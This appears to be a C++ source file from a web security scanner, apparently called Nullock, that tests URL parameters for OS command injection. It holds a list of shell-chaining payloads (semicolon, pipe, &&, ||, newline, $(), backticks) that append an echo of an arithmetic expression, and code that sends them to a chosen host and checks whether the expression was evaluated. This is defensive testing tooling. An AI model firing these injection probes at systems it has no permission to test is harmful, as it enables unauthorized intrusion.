#include "cmd_injection.hpp"
#include "networking.hpp"

#include <QRandomGenerator>
#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Core::CmdInjection {

namespace {

constexpr int kMaxSends = 90;

// How the injected command is chained onto the original. `%1` is the echo
// command body (already carrying the bracketed arithmetic).
struct Technique { const char *name; const char *tmpl; };
const QList<Technique> &techniques() {
    static const QList<Technique> t = {
        { "semicolon", "; echo %1" },
        { "pipe",      "| echo %1" },
        { "and",       "&& echo %1" },
        { "or",        "|| echo %1" },
        { "newline",   "\necho %1" },
        { "subshell",  "$(echo %1)" },
        { "backtick",  "`echo %1`" },
    };
    return t;
}

QByteArray buildRequest(const Request &req, const QString &query) {
    const QString target = query.isEmpty() ? req.basePath : req.basePath + "?" + query;
    QByteArray out;
    out  = req.method.toUtf8() + " " + target.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/cmdi\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    out += "Connection: close\r\n\r\n";
    return out;
}

// Set `param` to the percent-encoded `value` (the shell metacharacters must be
// encoded so they survive the request line; the server decodes them back).
QString queryWith(const QString &existing, const QString &param, const QString &value) {
    const QByteArray enc = QUrl::toPercentEncoding(value);
    QStringList parts;
    const QUrlQuery q(existing);
    for (const auto &kv : q.queryItems(QUrl::FullyEncoded))
        if (QUrl::fromPercentEncoding(kv.first.toUtf8()) != param)
            parts << kv.first + "=" + kv.second;
    parts << param + "=" + QString::fromUtf8(enc);
    return parts.join('&');
}

// The text the server placed between our sentinels, if any (bounded window).
QString rendered(const QString &body, const QString &pre, const QString &suf) {
    int p = body.indexOf(pre);
    while (p >= 0) {
        const int from = p + pre.size();
        const int s = body.indexOf(suf, from);
        if (s < 0) break;
        if (s - from <= 32) return body.mid(from, s - from);
        p = body.indexOf(pre, from);
    }
    return QString();
}

QString randTok() {
    static const char a[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    QString s = QStringLiteral("z");
    for (int i = 0; i < 7; ++i) s += a[QRandomGenerator::global()->bounded(int(sizeof(a) - 1))];
    return s;
}

} // namespace

QStringList defaultParams() {
    return { "cmd", "exec", "host", "ip", "ping", "domain", "name", "query",
             "q", "search", "file", "path", "url", "target", "addr" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    QStringList params;
    if (!req.param.isEmpty()) {
        params << req.param;
    } else {
        const QUrlQuery q(req.query);
        for (const auto &kv : q.queryItems())
            if (!params.contains(kv.first)) params << kv.first;
        if (params.isEmpty()) params = defaultParams();
    }
    while (params.size() > 6) params.removeLast();
    result.testedParams = params;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QString &query) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, query));
    };

    const auto base = send(req.query);
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;

    auto pick = [] { return QRandomGenerator::global()->bounded(1000u, 9999u); };
    const quint64 a = req.seedA ? req.seedA : pick();
    const quint64 b = req.seedB ? req.seedB : pick();
    const QString expr = QStringLiteral("$((%1*%2))").arg(a).arg(b);
    const QString product = QString::number(a * b);
    const QString pre = randTok(), suf = randTok();
    // echo body: <pre>$((a*b))<suf>  -> shell prints <pre><product><suf>
    const QString echoBody = pre + expr + suf;

    for (const QString &param : params) {
        if (result.requestsSent >= kMaxSends) break;
        bool paramHit = false;
        for (const Technique &t : techniques()) {
            if (result.requestsSent >= kMaxSends) break;
            // Prefix a benign value so the original command still parses, then
            // chain ours.
            const QString value = QStringLiteral("1") + QString::fromUtf8(t.tmpl).arg(echoBody);
            const auto r = send(queryWith(req.query, param, value));
            if (!r.ok) continue;
            const QString region = rendered(QString::fromUtf8(r.parsed.body), pre, suf);
            if (region.isEmpty()) continue;
            // Executed iff what landed between our sentinels is EXACTLY the
            // product -- the shell evaluated $((a*b)). Equality (not substring)
            // rejects both literal reflection of the expression and a product
            // that's merely a substring of unrelated reflected digits.
            if (region.trimmed() == product) {
                result.hits.append({ param, QString::fromUtf8(t.name), value,
                    QStringLiteral("executed %1 -> %2").arg(expr, product) });
                result.vulnerable = true;
                paramHit = true;
                break;
            }
        }
        if (paramHit) continue;
    }

    return result;
}

} // namespace Nullock::Core::CmdInjection
